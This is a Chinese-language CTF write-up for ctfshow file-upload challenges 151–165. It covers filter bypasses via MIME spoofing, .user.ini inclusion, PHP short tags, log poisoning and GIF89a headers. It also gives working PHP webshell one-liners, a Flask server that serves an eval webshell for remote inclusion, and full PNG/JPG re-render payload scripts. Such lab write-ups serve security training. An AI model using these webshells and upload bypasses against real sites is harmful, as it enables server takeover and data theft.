## 写在前面

开始文件上传系列，新的起点，加油！

——KonDream 2022年1月14日13:46:41

## web151(前端校验)

![image-20220114134736282](image/ctfshow-文件上传(151-170)/image-20220114134736282.png)

前端校验，直接禁用js后上传一句话，或者上传png然后抓包改后缀

## web152(MIME校验)

> hint：后端不能单一校验

前端+后端校验，这里是将一句话木马改为png后上传，再改后缀，经测试后端是MIME类型校验，改为png的image/png即可绕过

![image-20220114135421176](image/ctfshow-文件上传(151-170)/image-20220114135421176.png)

## web153(.user.ini)

这个题过滤了后缀php，一开始想着用php3，phtml等绕过，发现不能执行命令，然后访问upload时出现了不一样

![image-20220114142337227](image/ctfshow-文件上传(151-170)/image-20220114142337227.png)

nothing here？说明此处有个php页面，那么这个题考察的就是.user.ini的利用了

> 自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。

> 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。

> 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。

可以用的配置是auto_append_file和auto_prepend_file，前者在每个php文件尾加个include，后者在文件头加个include

**而且.user.ini只对同级目录下的文件起作用，同级目录下必须有个php文件才可以，这就是这个题的突破口。**

![image-20220114142942340](image/ctfshow-文件上传(151-170)/image-20220114142942340.png)

首先上传个.user.ini，在index.php中include进去k.png，然后上传带一句话的png

![image-20220114143121987](image/ctfshow-文件上传(151-170)/image-20220114143121987.png)

然后就是getshell后找flag了

![image-20220114143254131](image/ctfshow-文件上传(151-170)/image-20220114143254131.png)

## web154(短标签)

应该是对上传内容进行了过滤，不允许有php出现，那么就使用php短标签：<?= 代替 <?php

![image-20220114144039737](image/ctfshow-文件上传(151-170)/image-20220114144039737.png)

先传个带一句话的png，然后传.user.ini方法同上，最后拿shell找flag

## web155(短标签)

同上

## web156($_POST{1})

经测试，在上面的基础上过滤了文件内容中的 ] ，采用大括号进行绕过：``<?=eval($_POST{1});?>``

![image-20220114145000175](image/ctfshow-文件上传(151-170)/image-20220114145000175.png)

剩下操作同上

## web157(不写马，命令执行)

有点难搞，过滤了 { 和 ； 想要写马进去有点绕，所以就直接命令执行吧：``<?=system('tac ../flag.*')?>``

![image-20220114145952646](image/ctfshow-文件上传(151-170)/image-20220114145952646.png)

## web158(同上)

同上

## web159(同上)

过滤了（ 用反引号绕过：``<?=`tac ../flag.*`?>``

## web160(日志包含)

在上面的基础上过滤了反引号，系统命令不能用了，考虑日志包含

``<?=include"/var/lo"."g/nginx/access.lo"."g"?>``

![image-20220117175904340](image/ctfshow-文件上传(151-170)/image-20220117175904340.png)

然后在UA中插入一句话

![image-20220117180133199](image/ctfshow-文件上传(151-170)/image-20220117180133199.png)

最后getshell

![image-20220117180151043](image/ctfshow-文件上传(151-170)/image-20220117180151043.png)

## web161(GIF89a)

小知识点：GIF89a文件头欺骗，php下的检测函数getimagesize无法认定其图片无效

```php
//检查是否图片
    if(function_exists('getimagesize')) {
        $tmp_imagesize = @getimagesize($new_name);
        list($tmp_width, $tmp_height, $tmp_type) = (array)$tmp_imagesize;
        $tmp_size = $tmp_width * $tmp_height;
        if($tmp_size > 16777216 || $tmp_size < 4 || empty($tmp_type) || strpos($tmp_imagesize['mime'], 'flash') > 0) {
            @unlink($new_name);
            return cplang('only_allows_upload_file_types');
        }
    }
```

如果使用这个函数读取文件头为GIF89a的图片，php会认定这只是一个尺寸比较大的合法图片，所以存在检测漏洞

回到这个题，上传的时候加上GIF89a头就可以了

![image-20220117181330308](image/ctfshow-文件上传(151-170)/image-20220117181330308.png)

## web162(远程包含)

这个题过滤了文件内容中的. 也就是说上传的.user.ini是不能包含带后缀的文件的，在原wp中是要通过条件竞争的方式去解，思路是上传的速度要比服务器删除的速度快，所以采用竞争，但是因为最近群主大大限制了并发，条件竞争并不能做了，所以采用远程文件包含的方式

1. 拥有一台vps，并用flask将php一句话绑定在80端口上

   ```python
   '''
   Author: KonDream
   Date: 2022-01-03 22:45:59
   LastEditors:  KonDream
   LastEditTime: 2022-01-05 13:10:08
   Description:  
   '''
   from flask import *
   
   app = Flask(__name__)
   
   # 首页路由
   @app.route('/',methods=['GET', 'POST'])
   def index():
       return "<?php eval($_POST[1]);?>"
   
   if __name__ == "__main__":
       app.run(host='0.0.0.0', port=80, debug=True)
   ```

2. 上传.user.ini，绑定一个不带后缀的文件k![image-20220117193202242](image/ctfshow-文件上传(151-170)/image-20220117193202242.png)

3. 上传k，并包含远程vps地址，由于过滤了ip中的. 所以要将ip地址转数字，这里转：http://www.msxindl.com/tools/ip/ip_num.asp

   ![image-20220117193804385](image/ctfshow-文件上传(151-170)/image-20220117193804385.png)

4. 最后访问upload，即可getshell![image-20220117193859464](image/ctfshow-文件上传(151-170)/image-20220117193859464.png)

## web163(配置文件包含)

思路同上，但是上传的文件会被服务器立刻删掉，原预期解是通过竞争的方式，但是现在不行，所以就包含在配置文件里![image-20220117194817052](image/ctfshow-文件上传(151-170)/image-20220117194817052.png)![image-20220117194835364](image/ctfshow-文件上传(151-170)/image-20220117194835364.png)

值得注意的是这个题文件不会覆盖，所以只能包含一次，如果写错文件那么就要重开环境了hhh，而且162和163这种做法都要求服务器支持远程文件包含，如果服务器没开启这个选项的话那么就没办法这样做了

## web164(png二次渲染绕过)

访问upload目录发现没有index.php了，且只能上传图片，考虑png二次渲染绕过

大概思路是服务端会对客户端上传的文件内容进行二次渲染，比方说我在文件尾加入了一句话木马，但是上传后服务端会进行二次渲染，就将这句木马过滤掉了，绕过的姿势就是找到二次渲染前后文件内容没有变化的位置，将php一句话写入这个位置就可以绕过二次渲染

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'2.png');  //要修改的图片的路径
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */

?>
```

借大牛的脚本一用，运行脚本后会生成一个png图片，它符合png图片规范，将绕过二次渲染的一句话木马写入了IDAT数据块

上传图片后执行命令即可

![image-20220119133312983](image/ctfshow-文件上传(151-170)/image-20220119133312983.png)

## web165(jpg二次渲染绕过)

原理和png二次渲染绕过差不多，采用网上大牛的脚本

```php
<!-- 用法 php exp.php a.jpg -->
<?php
    $miniPayload = "<?=eval(\$_POST[1]);?>";

    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                	echo "error";
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

这里用某些jpg图片进行渲染成功率不高，这里采用热心群友的图片

![image-jpg二次渲染专用](image/ctfshow-文件上传(151-170)/jpg二次渲染专用.jpg)**先将这个图片上传到服务器进行一次渲染，然后将文件下载到本地，使用脚本处理后再进行上传**

![image-20220119142634515](image/ctfshow-文件上传(151-170)/image-20220119142634515.png)
